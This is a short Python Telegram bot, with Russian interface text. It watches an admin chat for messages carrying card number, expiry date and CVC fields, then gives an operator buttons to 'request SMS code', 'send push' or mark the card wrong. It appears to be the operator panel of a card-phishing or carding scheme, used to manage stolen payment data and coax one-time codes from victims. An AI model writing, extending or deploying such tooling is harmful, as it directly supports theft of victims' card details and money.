import asyncio
import os
from dotenv import load_dotenv
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton

load_dotenv()

BOT_TOKEN = os.getenv('BOT_TOKEN')
ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID')

if not BOT_TOKEN or not ADMIN_CHAT_ID:
    exit(1)

ADMIN_CHAT_ID = int(ADMIN_CHAT_ID)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

def get_payment_buttons():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="📱 SMS код", callback_data="sms_code"),
            InlineKeyboardButton(text="🔔 Пуш", callback_data="push")
        ],
        [
            InlineKeyboardButton(text="❌ Неверная карта", callback_data="wrong_card")
        ]
    ])

@dp.message(F.chat.id == ADMIN_CHAT_ID)
async def handle_chat_messages(message: types.Message):
    text = message.text or ""
    
    # Игнорируем команды
    if text.startswith('/'):
        return
        
    # Проверяем ключевые слова платежных данных
    if any(keyword in text for keyword in ["НОВАЯ ОПЛАТА", "Клиент:", "Карта:", "Номер:", "Срок:", "CVC:"]):
        # Отправляем кнопки
        await message.answer(
            "💳 <b>Выберите действие:</b>",
            reply_markup=get_payment_buttons(),
            parse_mode="HTML"
        )

@dp.callback_query(F.data == "sms_code")
async def sms_code_handler(callback: types.CallbackQuery):
    await callback.message.edit_text("📱 <b>SMS код запрошен</b>", parse_mode="HTML")
    await callback.answer()

@dp.callback_query(F.data == "push")
async def push_handler(callback: types.CallbackQuery):
    await callback.message.edit_text("🔔 <b>Пуш отправлен</b>", parse_mode="HTML")
    await callback.answer()

@dp.callback_query(F.data == "wrong_card")
async def wrong_card_handler(callback: types.CallbackQuery):
    await callback.message.edit_text("❌ <b>Карта отклонена</b>", parse_mode="HTML")
    await callback.answer()

async def main():
    print("Бот запущен! Ожидаю платежные данные в чате...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
